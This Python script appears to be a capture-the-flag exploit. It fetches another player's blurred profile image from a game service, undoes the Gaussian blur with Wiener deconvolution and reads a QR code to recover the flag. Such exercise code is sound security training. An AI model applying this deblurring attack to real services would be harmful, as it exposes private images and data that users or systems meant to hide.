import cv2
import numpy as np
from skimage import restoration
from PIL import Image
from utils import InteractionManager
from httpx import AsyncClient
import logging
import asyncio
import qr_codes
client = AsyncClient(base_url='http://172.23.216.176:8008')


log_file = 'checker.log'
logging.basicConfig(
    filename=log_file,
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)


def unblur(image):
    blur_sigma = 6  # Standard deviation for Gaussian kernel
    kernel_size = 15  # Kernel size used for blurring
    kernel_1d = cv2.getGaussianKernel(kernel_size, blur_sigma)
    kernel = np.outer(kernel_1d, kernel_1d.transpose())
    restored_img = np.zeros_like(image, dtype=np.float32)
    for i in range(3):
        restored_img[:, :, i] = restoration.wiener(
            image[:, :, i], kernel, 0.01, clip=False)
    restored_img = np.clip(restored_img, 0, 1)
    restored_img = (restored_img * 255).astype(np.uint8)
    return restored_img


async def exploit_blur(email):
    email = email
    name = email + "("
    m = InteractionManager(None, logger, client, name)
    pil_img, cv2_img = await m.download_profile_image(email)
    cv2_img = cv2_img.astype(np.float32) / 255.0
    restored_cv2_image = unblur(cv2_img)
    cv2.imshow('restored', restored_cv2_image)
    cv2.imshow('original', cv2_img)
    cv2.waitKey(0)
    restored_pil_image = cv2.cvtColor(restored_cv2_image, cv2.COLOR_BGR2RGB)
    restored_pil_image = Image.fromarray(restored_pil_image)
    flag = qr_codes.read_qr_code(restored_pil_image)
    print(flag)
    return flag

email = 'tgbbmOK7oQ@OpllPjuX6F.scam'
asyncio.run(exploit_blur(email))
